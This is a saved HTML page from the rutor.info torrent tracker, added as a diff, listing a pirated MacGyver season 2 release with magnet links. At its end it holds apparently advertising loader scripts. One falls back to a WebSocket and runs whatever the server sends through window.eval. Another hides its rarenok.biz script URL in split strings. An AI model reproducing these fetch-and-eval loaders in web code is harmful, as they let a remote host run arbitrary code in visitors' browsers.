@@ -1,0 +1,359 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: МакГайвер / MacGyver [S02] (2017) WEB-DL 1080p | NewStudio</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>МакГайвер / MacGyver [S02] (2017) WEB-DL 1080p | NewStudio</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:78a7582eb0917d76a2640682b066cc14898a5553&amp;dn=rutor.info_%D0%9C%D0%B0%D0%BA%D0%93%D0%B0%D0%B9%D0%B2%D0%B5%D1%80+%2F+MacGyver+%5BS02%5D+%282017%29+WEB-DL+1080p+%7C+NewStudio&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630501"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630501"><img src="http://s.rutor.info/t/down.png"> Скачать MacGyver_Season_02_NewStudio.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i91.fastpic.ru/big/2017/1012/ac/bc7b0e0d5c8a8e55281330d4591ee9ac.png" style="float:right;" /> <a href="/tag/4/" target="_blank"></a><br />
+ <a href="/tag/4/" target="_blank"></a><br />
+<u>Информация о сериале</u> <a href="/tag/4/" target="_blank"></a><br />
+<b>Название:</b> МакГайвер <a href="/tag/4/" target="_blank"></a><br />
+<b>Оригинальное название:</b> MacGyver <a href="/tag/4/" target="_blank"></a><br />
+<b>Год выпуска:</b> 2017 <a href="/tag/4/" target="_blank"></a><br />
+<b>Жанр:</b>  <a href="/tag/4/Боевик" target="_blank">Боевик</a>, <a href="/tag/4/драма" target="_blank">драма</a>, <a href="/tag/4/приключения" target="_blank">приключения</a> <a href="/tag/4/" target="_blank"></a><br />
+<b>Режиссер:</b> Стивен Херек, Мэтт Эрл Бисли <a href="/tag/4/" target="_blank"></a><br />
+<b>В ролях:</b> Джордж Идс, Джастин Хайрс, Сандрин Холт, Тристин Мейс, Лукас Тилл, Селена Андусе, Билли Блэр, Рауль Колон <a href="/tag/4/" target="_blank"></a><br />
+ <a href="/tag/4/" target="_blank"></a><br />
+<b>Описание сериала:</b> <a href="/tag/4/" target="_blank"></a><br />
+История молодого человека лет двадцати, Ангуса «Мака» МакГайвера, который создает тайную организацию внутри правительства США, где он использует свой исключительный талант в решении неординарных проблем и обширные научные знания, чтобы спасать жизни. Следовать за ним в его рискованных миссиях по всему свету будет независимый бывших агент ЦРУ Джек Далтон. Под эгидой Департамента Внешних Дел МакГайвер берется за спасение мира, вооружившись до зубов лишь смекалкой, жвачкой и скрепкой. <a href="/tag/4/" target="_blank"></a><br />
+ <a href="/tag/4/" target="_blank"></a><br />
+<a href="http://www.imdb.com/title/tt1399045/" target="_blank"><img src="http://s.rutor.info/imdb/pic/1399045.gif" /></a> <a href="http://www.kinopoisk.ru/film/463608/" target="_blank"><img src="http://www.kinopoisk.ru/rating/463608.gif" /></a><br />
+ <a href="/tag/4/" target="_blank"></a><br />
+<b>Выпущено:</b> США, Folks <a href="/tag/4/" target="_blank"></a><br />
+<b>Продолжительность: </b> ~ 00:43:00 <a href="/tag/4/" target="_blank"></a><br />
+<b>Перевод: </b>Профессиональный (многоголосый) [NewStudio] <a href="/tag/4/" target="_blank"></a><br />
+ <a href="/tag/4/" target="_blank"></a><br />
+<u>Файл</u> <a href="/tag/4/" target="_blank"></a><br />
+<b>Качество:</b> WEB-DL 1080p <a href="/tag/4/" target="_blank"></a><br />
+<b>Видео:</b> MPEG-4 AVC, ~5000 Кбит/с, 1920x1080 <a href="/tag/4/" target="_blank"></a><br />
+<b>Аудио:</b> Русский, английский (АС3, 6 ch, 384 Кбит/с) <a href="/tag/4/" target="_blank"></a><br />
+ <a href="/tag/4/" target="_blank"></a><br />
+<span style="color:#008000;"><u><b>Присутствует аудиореклама! Видеоряд чистый !</b></u></span> <a href="/tag/4/" target="_blank"></a><br />
+ <a href="/tag/4/" target="_blank"></a><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://radikal.ru/fp/iebgmpfaqdgs8" target="_blank"><img src="http://s019.radikal.ru/i644/1610/0b/e6127129759bt.jpg" /></a> <a href="http://radikal.ru/fp/okanm0gysyn8v" target="_blank"><img src="http://s41.radikal.ru/i091/1610/5a/31151d3a1c14t.jpg" /></a> <a href="http://radikal.ru/fp/ve74vvv8x8986" target="_blank"><img src="http://s013.radikal.ru/i324/1610/af/5c3af28ad6d8t.jpg" /></a></textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1500895/0" target="_blank">SANNYa1993</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/seriali" target="_blank">Сериалы </a></td></tr>
+<tr><td class="header">Раздают</td><td>3</td></tr>
+<tr><td class="header">Качают</td><td>12</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (21 минуту назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 16:53:49  (16 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>40.95&nbsp;GB  (43967945044 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630501);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>28&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/626604"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e5ce8cc5f76dd77f597acdd3eff70e75c113c272&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/626604/makgajver_macgyver-02x01-15-iz-22-2017-webrip-720p-d">МакГайвер / MacGyver [02x01-15 из 22] (2017) WEBRip 720p | D </a></td> 
+<td align="right">30.77&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="tum"><td>21&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/617885"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ef3f926b77648aa8a0cb24a3104047db8c6ca3d0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/617885/makgajver_macgyver-02x01-20-iz-23-2017-web-dl-720p-newstudio">МакГайвер / MacGyver [02x01-20 из 23] (2017) WEB-DL 720p | NewStudio </a></td> 
+<td align="right">28.89&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="gai"><td>11&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/610138"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c64cee7192c6c2424c90099ac437c4dd4938e7de&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/610138/makgajver_macgyver-02x01-19-iz-23-2017-web-dlrip-newstudio">МакГайвер / MacGyver [02x01-19 из 23] (2017) WEB-DLRip | NewStudio </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">10.20&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>08&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/620488"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:86a738cce89f8e9460c2f1e05d184d201da27cb6&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/620488/makgajver_macgyver-s01-2016-web-dl-720p-d">МакГайвер / MacGyver [S01] (2016) WEB-DL 720p | D </a></td> 
+<td align="right">27.30&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="gai"><td>16&nbsp;Дек&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/602658"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3d7f67cf46a02d94a0d82b1e25d48dba4738c7bf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/602658/makgajver_macgyver-02h01-11-iz-23-2017-hdtvrip-720p-sunshine-studio">МакГайвер / MacGyver [02х01-11 из 23] (2017) HDTVRip 720p | Sunshine Studio </a></td> 
+<td align="right">11.70&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="tum"><td>21&nbsp;Апр&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/530421"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3b5198a585c553b42157d57cc23cb512107f0b86&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/530421/makgajver_macgyver-s01-2016-hdtvrip-720p-viruseproject">МакГайвер / MacGyver [S01] (2016) HDTVRip 720p | ViruseProject </a></td> 
+<td align="right">21.65&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>21&nbsp;Апр&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/530420"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8639a58d3e0df30a73ebab7679f67260c2b5aacb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/530420/makgajver_macgyver-s01-2016-hdtvrip-viruseproject">МакГайвер / MacGyver [S01] (2016) HDTVRip | ViruseProject </a></td> 
+<td align="right">13.53&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/4/0/0/МакГайвер" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630501.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (23)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630501">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630501);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630501);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630501">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
